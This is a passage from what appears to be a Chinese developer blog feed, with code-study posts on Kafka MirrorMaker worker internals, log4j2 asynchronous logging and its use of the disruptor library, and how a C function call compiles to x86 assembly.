class="hljs-comment">// register the MirrorMaker worker</span><span class="hljs-keyword">val</span> stateModelFactory = <span class="hljs-keyword">new</span> <span class="hljs-type">HelixWorkerOnlineOfflineStateModelFactory</span>(instanceId, fetchNum, connectorMap)stateMachineEngine.registerStateModelFactory(<span class="hljs-string">"OnlineOffline"</span>, stateModelFactory)helixZkManager.connect()helixAdmin = helixZkManager.getClusterManagmentTool</code></pre><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelixWorkerOnlineOfflineStateModelFactory</span>(<span class="hljs-params">final val instanceId: <span class="hljs-type">String</span>, final val fetchNum: <span class="hljs-type">Int</span>,</span></span><span class="hljs-class"><span class="hljs-params">                                                final val connectorMap: <span class="hljs-type">ConcurrentHashMap</span>[<span class="hljs-type">String</span>, <span class="hljs-type">KafkaConnector</span>]</span>) <span class="hljs-keyword">extends</span> <span class="hljs-title">StateModelFactory</span>[<span class="hljs-type">StateModel</span>] </span>&#123;  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createNewStateModel</span></span>(partitionName: <span class="hljs-type">String</span>) = <span class="hljs-keyword">new</span> <span class="hljs-type">OnlineOfflineStateModel</span>(instanceId, connectorMap)  <span class="hljs-comment">// register mm instance</span>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OnlineOfflineStateModel</span>(<span class="hljs-params">final val instanceId: <span class="hljs-type">String</span>, final val connectors: <span class="hljs-type">ConcurrentHashMap</span>[<span class="hljs-type">String</span>, <span class="hljs-type">KafkaConnector</span>]</span>) <span class="hljs-keyword">extends</span> <span class="hljs-title">StateModel</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">onBecomeOnlineFromOffline</span></span>(message: <span class="hljs-type">Message</span>, context: <span class="hljs-type">NotificationContext</span>) = &#123;      <span class="hljs-comment">// add topic partition on the instance</span>      connectorMap.get(getFetcherId(message.getResourceName, message.getPartitionName.toInt)).addTopicPartition(message.getResourceName, message.getPartitionName.toInt)    &#125;    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">onBecomeOfflineFromOnline</span></span>(message: <span class="hljs-type">Message</span>, context: <span class="hljs-type">NotificationContext</span>) = &#123;      <span class="hljs-comment">// delete topic partition on the instance</span>      connectorMap.get(getFetcherId(message.getResourceName, message.getPartitionName.toInt)).deleteTopicPartition(message.getResourceName, message.getPartitionName.toInt)    &#125;    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">onBecomeDroppedFromOffline</span></span>(message: <span class="hljs-type">Message</span>, context: <span class="hljs-type">NotificationContext</span>) = &#123;      <span class="hljs-comment">// do nothing</span>    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getFetcherId</span></span>(topic: <span class="hljs-type">String</span>, partitionId: <span class="hljs-type">Int</span>): <span class="hljs-type">String</span> = &#123;      <span class="hljs-string">""</span> + <span class="hljs-type">Utils</span>.abs(<span class="hljs-number">31</span> * topic.hashCode() + partitionId) % fetchNum    &#125;  &#125;&#125;</code></pre><h3 id="run方法逻辑"><a href="#run方法逻辑" class="headerlink" title="run方法逻辑"></a>run方法逻辑</h3><ul><li>通过KafkaConnector拿到KafkaStream，通过KafkaStream拿到ConsumerIterator</li><li>在没有关闭时，一直迭代ConsumerIterator</li><li>拿到迭代器中的数据，就是取到的消息(为什么迭代器中能一直有消息，因为这样反推iter–&gt;KafkaStream–&gt;KafkaConnector+Queue–&gt;PartitionTopicInfo–&gt;fetcherManager.partitionAddMap–&gt;fetcherManager.partitionInfoMap–&gt;fetcherManager.createFetcherThread–&gt;CompactConsumerFetcherThread.partitionInfoMap–&gt;CompactConsumerFetcherThread.processPartitionData–&gt;CompactConsumerFetcherThread.doWork–&gt;ShutdownableThread.run//spin)</li><li>经过MirrorMakerMessageHandler处理消息形成ProducerRecord数组实例，主要是分区对齐</li><li>用producer发到目标集群</li><li>用maybeFlushAndCommitOffsets方法flush并提交offset</li><li>真正commit offset的动作由自行实现的KafkaConnector完成，记录在ZK上，提交是定时提交  </li></ul><h2 id="CompactConsumerFetcherThread分析"><a href="#CompactConsumerFetcherThread分析" class="headerlink" title="CompactConsumerFetcherThread分析"></a>CompactConsumerFetcherThread分析</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p><code>CompactConsumerFetcherThread</code>是继承自Kafka提供的<code>ShutdownableThread</code>，<code>ShutdownableThread</code>内部会在isRunning标志位ok的情况下以spin的形式一直调用<code>doWork</code>方法。  </p><pre><code class="hljs scala"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span></span>(): <span class="hljs-type">Unit</span> = &#123;  info(<span class="hljs-string">"Starting "</span>)  <span class="hljs-keyword">try</span>&#123;    <span class="hljs-keyword">while</span>(isRunning.get())&#123;      doWork()    &#125;  &#125; <span class="hljs-keyword">catch</span>&#123;    <span class="hljs-keyword">case</span> e: <span class="hljs-type">Throwable</span> =&gt;      <span class="hljs-keyword">if</span>(isRunning.get())        error(<span class="hljs-string">"Error due to "</span>, e)  &#125;  shutdownLatch.countDown()  info(<span class="hljs-string">"Stopped "</span>)&#125;</code></pre><h3 id="doWork方法分析"><a href="#doWork方法分析" class="headerlink" title="doWork方法分析"></a>doWork方法分析</h3><ul><li>锁定partitionMapLock</li><li>锁定updateMapLock</li><li>将partitionAddMap中的数据放到partitionMap，然后清空partitionAddMap</li><li>将partitionDeleteMap中的数据从partitionMap中移除并移除fetcherLagStats中对应的stat，然后清空partitionDeleteMap</li><li>迭代partitionMap将需要拉取的topic、partition、fetchoffset、fetchsize等信息加入fetchRequestBuilder</li><li>用fetchRequestBuilder构造出FetchRequest实例</li><li>如果fetchRequest.requestInfo.isEmpty是空的，那么等待fetchBackOffMs</li><li>对于两次拉取间隔是否过大做日志输出(DUMP_INTERVAL_MS = 5 * 60 * 1000)</li><li>processFetchRequest 处理拉的请求</li></ul><h3 id="processFetchRequest方法分析"><a href="#processFetchRequest方法分析" class="headerlink" title="processFetchRequest方法分析"></a>processFetchRequest方法分析</h3><p>当doWork方法准备好了FetchRequest实例就要靠processFetchRequest方法来拉数据给partitionInfoMap中的PartitionTopicInfo实例中的队列了。简单过程如下：    </p><ul><li>迭代响应中的每条数据，按每个分区维度处理</li><li>拿到消息</li><li>根据拿到的消息算出下一次的new offset，并更新到partitionMap中</li><li>更新度量信息，计算堆积</li><li>将取到的消息在PartitionTopicInfo实例中放入队列。 PartitionTopicInfo实例的队列来自Connect中的构造KafkaStream实例时传递的同一个队列。 这样能打通连接器和stream</li></ul>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>kafka1.0源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log4j2异步日志配置及官方文档的问题澄清</title>
    <link href="/2020/04/24/log4j2-async-config/"/>
    <url>/2020/04/24/log4j2-async-config/</url>
    
    <content type="html"><![CDATA[<h2 id="配置及demo"><a href="#配置及demo" class="headerlink" title="配置及demo"></a>配置及demo</h2><h3 id="方法一全部打开"><a href="#方法一全部打开" class="headerlink" title="方法一全部打开"></a>方法一全部打开</h3><p>加启动参数 -DLog4jContextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector<br>启动参数的这个key有点说法：<br>按官方文档说明<a href="http://logging.apache.org/log4j/2.x/manual/async.html#AllAsync" target="_blank" rel="noopener">http://logging.apache.org/log4j/2.x/manual/async.html#AllAsync</a> key是-Dlog4j2.contextSelector=…<br>但是你如果亲自做实验，或亲自使用过，可能就会发现问题，简单的说跟你使用的版本有关：<br>-DLog4jContextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector  // ==全版本==支持<br>-Dlog4j2.contextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector // ==2.10.0==以后版本支持<br><a href="http://logging.apache.org/log4j/2.x/manual/async.html" target="_blank" rel="noopener">仔细看官方文档上有一句</a></p><blockquote><p>Note that system properties were renamed into a more consistent style in Log4j 2.10.0. All old property names are still supported which are documented here. </p></blockquote><p>相关代码(2.10.0以后版本)：<br>参见 org.apache.logging.log4j.util.PropertiesPropertySource 和<br>org.apache.logging.log4j.util.PropertiesUtil.Environment<br>Environment中有三组配置数据，key不同，业务语义相同：  </p><pre><code class="hljs java">literal&#123;java.runtime.name=Java(TM) SE Runtime Environment&#125;normalized&#123;log4j2.javaRuntimeName=Java(TM) SE Runtime Environment&#125; key 是log4j2.前缀 加上驼峰形式变量tokenized&#123;[java, runtime, name]=Java(TM) SE Runtime Environment&#125;  key是list</code></pre><h3 id="方法二同步异步混合"><a href="#方法二同步异步混合" class="headerlink" title="方法二同步异步混合"></a>方法二同步异步混合</h3><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 使用异步日志时，启用如下配置，异步配置默认不打印location。此种方法无需配置JVM启动参数。 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">asyncRoot</span> <span class="hljs-attr">level</span>=<span class="hljs-string">"debug"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">AppenderRef</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"Console"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">asyncRoot</span>&gt;</span></code></pre><h2 id="一些说明"><a href="#一些说明" class="headerlink" title="一些说明"></a>一些说明</h2><ul><li>默认不打印location信息，诸如代码行号，类，方法等。 如果需要的话需要加上<code>includeLocation=&quot;true&quot;</code>，但是按官方说法会慢30-100倍。  </li><li>异步的时候，如果在真正打印日志时，日志信息中所引用的对象中的字段值发生了改变，比如”hello {}”, user.name这种。会不会影响打印日志的准确性。答案是不会，因为log4j做了snapshot机制。  </li></ul><h2 id="异步日志的弊端"><a href="#异步日志的弊端" class="headerlink" title="异步日志的弊端"></a>异步日志的弊端</h2><p>异步日志不是只有优点没有弊端的，官方给出了一些不使用的场景(Drawbacks):  </p><ul><li>异常处理。即使有异常处理器，也不能覆盖所有的案例。  </li><li>在一些使用了诸如 MapMessage 和 StructuredDataMessage 这种没法通过snapshot规避异步打印时日志信息可能变化的问题</li><li>在CPU很少的环境，比如就1个CPU</li><li>打印日志的速度远远超过<code>appender</code>的吞吐。此时异步并不能解决问题，需要用更快的appender。</li></ul>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>log4j2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log4j2用asyncRoot配置异步日志是如何使用disruptor</title>
    <link href="/2020/04/24/log4j2-how-to-config-async/"/>
    <url>/2020/04/24/log4j2-how-to-config-async/</url>
    
    <content type="html"><![CDATA[<p>用<code>asyncRoot</code>配置对应的对接disruptor类是<code>AsyncLoggerConfigDisruptor</code>,用<code>Log4jContextSelector</code>启动参数配置全局异步的对应的对接disruptor类是<code>AsyncLoggerDisruptor</code>。下面分析的是<code>AsyncLoggerConfigDisruptor</code>  </p><h2 id="disruptor的创建与启动需要的部件实现"><a href="#disruptor的创建与启动需要的部件实现" class="headerlink" title="disruptor的创建与启动需要的部件实现"></a>disruptor的创建与启动需要的部件实现</h2><p><code>AsyncLoggerConfigDisruptor.start</code>方法用来创建并启动<code>disruptor</code>实例<br>创建disruptor需要<code>EventFactory</code>，<code>ringBuffer的大小</code>，<code>ThreadFactory</code>，<code>ProducerType</code>，<code>等待策略waitStrategy</code><br>创建后需要设置<code>ExceptionHandler</code>，设置<code>EventHandler</code>。<br>发布(生产)事件的translator。  </p><h3 id="EventFactory"><a href="#EventFactory" class="headerlink" title="EventFactory"></a>EventFactory</h3><p>分是否可变(<code>mutable</code>字段)场景对应两个不同的EventFactory。<br>不可变的factory的逻辑是：</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> Log4jEventWrapper <span class="hljs-title">newInstance</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Log4jEventWrapper();&#125;</code></pre><p>可变的factory逻辑是：</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Log4jEventWrapper <span class="hljs-title">newInstance</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Log4jEventWrapper(<span class="hljs-keyword">new</span> MutableLogEvent());&#125;</code></pre><p>会在 <code>Log4jEventWrapper</code>的构造函数中传入<code>MutableLogEvent</code>实例。</p><h3 id="ringBuffer的大小"><a href="#ringBuffer的大小" class="headerlink" title="ringBuffer的大小"></a>ringBuffer的大小</h3><p>是根据<code>AsyncLoggerConfig.RingBufferSize</code>配置值算出来的。<br>这个配置项的值最小不能小于<strong>128</strong>，默认值分两种情况进行设定：如果启用了ENABLE_THREADLOCALS(优化GC的一个配置项)，那么默认值是<code>4 * 1024</code>，否则是<code>256 * 1024</code>。<br>这个配置是通过System properties指定，同样存在不同版本，配置项名称不一致的情况，log4j2.asyncLoggerRingBufferSize (AsyncLogger.RingBufferSize)。详细可以参见<a href="http://logging.apache.org/log4j/2.x/manual/configuration.html#SystemProperties" target="_blank" rel="noopener">这里</a>  </p><h3 id="ThreadFactory"><a href="#ThreadFactory" class="headerlink" title="ThreadFactory"></a>ThreadFactory</h3><p>主要是定制线程名：<br>线程名格式是：”AsyncLoggerConfig-“ + FACTORY_NUMBER(自增) + “-“ + threadFactoryName + “-“ + THREAD_NUMBER(自增)<br>默认的实际示例是： Log4j2-TF-1-AsyncLoggerConfig–1，跟上面的有些差异，上面的分析错了吗？？    </p><h3 id="ProducerType"><a href="#ProducerType" class="headerlink" title="ProducerType"></a>ProducerType</h3><p>多生产者  </p><h3 id="等待策略waitStrategy"><a href="#等待策略waitStrategy" class="headerlink" title="等待策略waitStrategy"></a>等待策略waitStrategy</h3><p>默认是10ms的TimeoutBlockingWaitStrategy。 支持可配置<code>SleepingWaitStrategy</code>、<code>YieldingWaitStrategy</code>、<code>BlockingWaitStrategy</code>、<code>BusySpinWaitStrategy</code>、<code>TimeoutBlockingWaitStrategy</code>。<br>这个配置是通过System properties指定，同样存在不同版本，配置项名称不一致的情况，log4j2.asyncLoggerWaitStrategy (AsyncLogger.WaitStrategy)。  </p><h3 id="ExceptionHandler"><a href="#ExceptionHandler" class="headerlink" title="ExceptionHandler"></a>ExceptionHandler</h3><p>可以配置，配置项名称是AsyncLoggerConfig.ExceptionHandler，默认是用AsyncLoggerConfigDefaultExceptionHandler，打印: AsyncLogger error handling event seq=…, value=…,并打出异常栈。  </p><h3 id="EventHandler"><a href="#EventHandler" class="headerlink" title="EventHandler"></a>EventHandler</h3><p>此处使用了 Log4jEventWrapperHandler RingBufferLogEventHandler，是disruptor的SequenceReportingEventHandler实现。  </p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * EventHandler performs the work in a separate thread.</span><span class="hljs-comment"> */</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Log4jEventWrapperHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">SequenceReportingEventHandler</span>&lt;<span class="hljs-title">Log4jEventWrapper</span>&gt; </span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> NOTIFY_PROGRESS_THRESHOLD = <span class="hljs-number">50</span>;    <span class="hljs-keyword">private</span> Sequence sequenceCallback;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> counter;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setSequenceCallback</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Sequence sequenceCallback)</span> </span>&#123;        <span class="hljs-keyword">this</span>.sequenceCallback = sequenceCallback;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onEvent</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Log4jEventWrapper event, <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> sequence, <span class="hljs-keyword">final</span> <span class="hljs-keyword">boolean</span> endOfBatch)</span></span><span class="hljs-function">            <span class="hljs-keyword">throws</span> Exception </span>&#123;        event.event.setEndOfBatch(endOfBatch);        event.loggerConfig.asyncCallAppenders(event.event);        event.clear();        notifyIntermediateProgress(sequence);    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * Notify the BatchEventProcessor that the sequence has progressed. Without this callback the sequence would not</span><span class="hljs-comment">     * be progressed until the batch has completely finished.</span><span class="hljs-comment">     */</span>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">notifyIntermediateProgress</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> sequence)</span> </span>&#123;        <span class="hljs-keyword">if</span> (++counter &gt; NOTIFY_PROGRESS_THRESHOLD) &#123;            sequenceCallback.set(sequence);            counter = <span class="hljs-number">0</span>;        &#125;    &#125;&#125;</code></pre><p>event.loggerConfig.asyncCallAppenders(event.event);  这个会触发日志的输出  </p><h3 id="translator"><a href="#translator" class="headerlink" title="translator"></a>translator</h3><p>跟<code>EventFactory</code>一样分<code>mutable</code>是否可变的两种情况。<br>不可变：</p><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> EventTranslatorTwoArg&lt;Log4jEventWrapper, LogEvent, AsyncLoggerConfig&gt; TRANSLATOR =        <span class="hljs-keyword">new</span> EventTranslatorTwoArg&lt;Log4jEventWrapper, LogEvent, AsyncLoggerConfig&gt;() &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">translateTo</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Log4jEventWrapper ringBufferElement, <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> sequence,</span></span><span class="hljs-function"><span class="hljs-params">            <span class="hljs-keyword">final</span> LogEvent logEvent, <span class="hljs-keyword">final</span> AsyncLoggerConfig loggerConfig)</span> </span>&#123;        ringBufferElement.event = logEvent;        ringBufferElement.loggerConfig = loggerConfig;    &#125;&#125;;</code></pre><p>可变：</p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Object responsible for passing on data to a RingBuffer event with a MutableLogEvent.</span><span class="hljs-comment"> */</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> EventTranslatorTwoArg&lt;Log4jEventWrapper, LogEvent, AsyncLoggerConfig&gt; MUTABLE_TRANSLATOR =        <span class="hljs-keyword">new</span> EventTranslatorTwoArg&lt;Log4jEventWrapper, LogEvent, AsyncLoggerConfig&gt;() &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">translateTo</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Log4jEventWrapper ringBufferElement, <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> sequence,</span></span><span class="hljs-function"><span class="hljs-params">            <span class="hljs-keyword">final</span> LogEvent logEvent, <span class="hljs-keyword">final</span> AsyncLoggerConfig loggerConfig)</span> </span>&#123;        ((MutableLogEvent) ringBufferElement.event).initFrom(logEvent);        ringBufferElement.loggerConfig = loggerConfig;    &#125;&#125;;</code></pre><p>都是完成一个事情给ringBufferElement元素的event赋值或者初始化。  </p><h2 id="事件进队列的tryEnqueue方法逻辑分析"><a href="#事件进队列的tryEnqueue方法逻辑分析" class="headerlink" title="事件进队列的tryEnqueue方法逻辑分析"></a>事件进队列的tryEnqueue方法逻辑分析</h2><ul><li>prepareEvent </li></ul><ol><li>ensureImmutable：创建LogEvent的快照，传递进来的原LogEvent在应用线程还会被继续修改，所以此处要创建快照</li><li>Log4jLogEvent.makeMessageImmutable：格式化消息。因为是异步日志，针对需要format的消息在此处进行格式化，否则会因为引用对象值的改变导致日志不准确</li></ol><ul><li>tryPublishEvent</li></ul><ol><li>发布事件对象到disruptor队列</li></ol><h2 id="事件出队列的处理"><a href="#事件出队列的处理" class="headerlink" title="事件出队列的处理"></a>事件出队列的处理</h2><p>先看按下调用栈:  </p><pre><code class="hljs java">Daemon Thread [Log4j2-TF-<span class="hljs-number">1</span>-AsyncLoggerConfig--<span class="hljs-number">1</span>] (Suspended (breakpoint at line <span class="hljs-number">37</span> in PatternFormatter))PatternFormatter.format(LogEvent, StringBuilder) line: <span class="hljs-number">37</span>PatternLayout$PatternSerializer.toSerializable(LogEvent, StringBuilder) line: <span class="hljs-number">334</span>PatternLayout.toText(AbstractStringLayout$Serializer2, LogEvent, StringBuilder) line: <span class="hljs-number">233</span>PatternLayout.encode(LogEvent, ByteBufferDestination) line: <span class="hljs-number">218</span>PatternLayout.encode(Object, ByteBufferDestination) line: <span class="hljs-number">58</span>ConsoleAppender(AbstractOutputStreamAppender&lt;M&gt;).directEncodeEvent(LogEvent) line: <span class="hljs-number">177</span>ConsoleAppender(AbstractOutputStreamAppender&lt;M&gt;).tryAppend(LogEvent) line: <span class="hljs-number">170</span>ConsoleAppender(AbstractOutputStreamAppender&lt;M&gt;).append(LogEvent) line: <span class="hljs-number">161</span>AppenderControl.tryCallAppender(LogEvent) line: <span class="hljs-number">156</span>AppenderControl.callAppender0(LogEvent) line: <span class="hljs-number">129</span>AppenderControl.callAppenderPreventRecursion(LogEvent) line: <span class="hljs-number">120</span>AppenderControl.callAppender(LogEvent) line: <span class="hljs-number">84</span>AsyncLoggerConfig(LoggerConfig).callAppenders(LogEvent) line: <span class="hljs-number">448</span>AsyncLoggerConfig.asyncCallAppenders(LogEvent) line: <span class="hljs-number">129</span>AsyncLoggerConfigDisruptor$Log4jEventWrapperHandler.onEvent(AsyncLoggerConfigDisruptor$Log4jEventWrapper, <span class="hljs-keyword">long</span>, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">111</span>AsyncLoggerConfigDisruptor$Log4jEventWrapperHandler.onEvent(Object, <span class="hljs-keyword">long</span>, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">97</span>BatchEventProcessor&lt;T&gt;.run() line: <span class="hljs-number">129</span>Log4jThread(Thread).run() line: <span class="hljs-number">748</span></code></pre><p>Log4jEventWrapperHandler.onEvent 111行是event.loggerConfig.asyncCallAppenders(event.event)，参见上面EventHandler，此处完成日志真正写出。</p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>log4j2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log4j2如何使用disruptor</title>
    <link href="/2020/04/24/log4j2-how-to-use-disruptor/"/>
    <url>/2020/04/24/log4j2-how-to-use-disruptor/</url>
    
    <content type="html"><![CDATA[<p>与 <strong>log4j2用asyncRoot配置异步日志是如何使用disruptor</strong>差异有几个：</p><h2 id="给disruptor实例的EventFactory不同"><a href="#给disruptor实例的EventFactory不同" class="headerlink" title="给disruptor实例的EventFactory不同"></a>给disruptor实例的EventFactory不同</h2><p>此处EventFactory采用的是RingBufferLogEvent.FACTORY，newInstance逻辑大致是：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> RingBufferLogEvent <span class="hljs-title">newInstance</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">final</span> RingBufferLogEvent result = <span class="hljs-keyword">new</span> RingBufferLogEvent();    <span class="hljs-keyword">if</span> (Constants.ENABLE_THREADLOCALS) &#123;        result.messageText = <span class="hljs-keyword">new</span> StringBuilder(Constants.INITIAL_REUSABLE_MESSAGE_SIZE);        result.parameters = <span class="hljs-keyword">new</span> Object[<span class="hljs-number">10</span>];    &#125;    <span class="hljs-keyword">return</span> result;&#125;</code></pre><p>创建的是 <code>RingBufferLogEvent</code>实例。该对象封装了日志输出的执行动作等。</p><h2 id="给disruptor的threadFactory的参数不同"><a href="#给disruptor的threadFactory的参数不同" class="headerlink" title="给disruptor的threadFactory的参数不同"></a>给disruptor的threadFactory的参数不同</h2><p>thread factory的名字是”AsyncLogger[“ + contextName + “]”  </p><h2 id="给disruptor的EventHandler不同"><a href="#给disruptor的EventHandler不同" class="headerlink" title="给disruptor的EventHandler不同"></a>给disruptor的EventHandler不同</h2><p>此处用RingBufferLogEventHandler，对接RingBufferLogEvent实例处理日志写出。  </p><h2 id="给disrupto的Translator不同"><a href="#给disrupto的Translator不同" class="headerlink" title="给disrupto的Translator不同"></a>给disrupto的Translator不同</h2><p>此处用RingBufferLogEventTranslator，对接RingBufferLogEvent实例组装日志信息。</p><h2 id="事件进入队列方式不同"><a href="#事件进入队列方式不同" class="headerlink" title="事件进入队列方式不同"></a>事件进入队列方式不同</h2><p>封装了一个叫tryPublish的方法进入队列。</p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>log4j2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数调用与汇编指令的关系</title>
    <link href="/2020/04/24/fun-call-assembly/"/>
    <url>/2020/04/24/fun-call-assembly/</url>
    
    <content type="html"><![CDATA[<h2 id="写一段简单的C代码分析其背后与汇编指令的关系"><a href="#写一段简单的C代码分析其背后与汇编指令的关系" class="headerlink" title="写一段简单的C代码分析其背后与汇编指令的关系"></a>写一段简单的C代码分析其背后与汇编指令的关系</h2><p>最近在看hotspot的代码，hotspot解释器会将字节码翻译成汇编指令，所以要先复习下这个基础<br>这篇讲的太泛了，看 <a href="https://www.cnblogs.com/simoncook/p/11668473.html" target="_blank" rel="noopener">这篇吧，是一步一步有图对应的</a></p><h3 id="C代码"><a href="#C代码" class="headerlink" title="C代码"></a>C代码</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span>  <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> args, <span class="hljs-keyword">char</span>** argv)</span></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, add1(<span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">500</span>, <span class="hljs-number">600</span>));&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add1</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j, <span class="hljs-keyword">int</span> k, <span class="hljs-keyword">int</span> m)</span></span>&#123;<span class="hljs-keyword">return</span> i + j + k + m;&#125;</code></pre><h3 id="gcc编译验证执行结果："><a href="#gcc编译验证执行结果：" class="headerlink" title="gcc编译验证执行结果："></a>gcc编译验证执行结果：</h3><pre><code class="hljs shell">gcc -g2 FunctionInvokedAssembly.c -o FunctionInvokedAssembly./FunctionInvokedAssembly  <span class="hljs-meta">#</span><span class="bash">1400</span></code></pre><h3 id="gcc编译成汇编代码"><a href="#gcc编译成汇编代码" class="headerlink" title="gcc编译成汇编代码"></a>gcc编译成汇编代码</h3><pre><code class="hljs shell">gcc -S -o FunctionInvokedAssembly.s FunctionInvokedAssembly.c</code></pre><p>汇编代码如下：  </p><pre><code class="hljs x86asm"><span class="hljs-meta">.file</span><span class="hljs-string">"FunctionInvokedAssembly.c"</span><span class="hljs-meta">.section</span>.rodata<span class="hljs-symbol">.LC0:</span><span class="hljs-meta">.string</span><span class="hljs-string">"%d"</span><span class="hljs-meta">.text</span><span class="hljs-meta">.globl</span>main<span class="hljs-meta">.type</span>main, @function<span class="hljs-symbol">main:</span><span class="hljs-symbol">.LFB0:</span><span class="hljs-meta">.cfi_startproc</span>pushq%rbp<span class="hljs-meta">.cfi_def_cfa_offset</span> <span class="hljs-number">16</span><span class="hljs-meta">.cfi_offset</span> <span class="hljs-number">6</span>, -<span class="hljs-number">16</span><span class="hljs-keyword">movq</span>%rsp, %rbp<span class="hljs-meta">.cfi_def_cfa_register</span> <span class="hljs-number">6</span>subq<span class="hljs-number">$16</span>, %rspmovl%edi, -<span class="hljs-number">4</span>(%rbp)<span class="hljs-keyword">movq</span>%rsi, -<span class="hljs-number">16</span>(%rbp)movl<span class="hljs-number">$600</span>, %ecxmovl<span class="hljs-number">$500</span>, %edxmovl<span class="hljs-number">$200</span>, %esimovl<span class="hljs-number">$100</span>, %edimovl<span class="hljs-number">$0</span>, %eax<span class="hljs-keyword">call</span>add1movl%eax, %esimovl$.LC0, %edimovl<span class="hljs-number">$0</span>, %eax<span class="hljs-keyword">call</span>printf<span class="hljs-keyword">leave</span><span class="hljs-meta">.cfi_def_cfa</span> <span class="hljs-number">7</span>, <span class="hljs-number">8</span><span class="hljs-keyword">ret</span><span class="hljs-meta">.cfi_endproc</span><span class="hljs-symbol">.LFE0:</span><span class="hljs-meta">.size</span>main, .-main<span class="hljs-meta">.globl</span>add1<span class="hljs-meta">.type</span>add1, @function<span class="hljs-symbol">add1:</span><span class="hljs-symbol">.LFB1:</span><span class="hljs-meta">.cfi_startproc</span>pushq%rbp<span class="hljs-meta">.cfi_def_cfa_offset</span> <span class="hljs-number">16</span><span class="hljs-meta">.cfi_offset</span> <span class="hljs-number">6</span>, -<span class="hljs-number">16</span><span class="hljs-keyword">movq</span>%rsp, %rbp<span 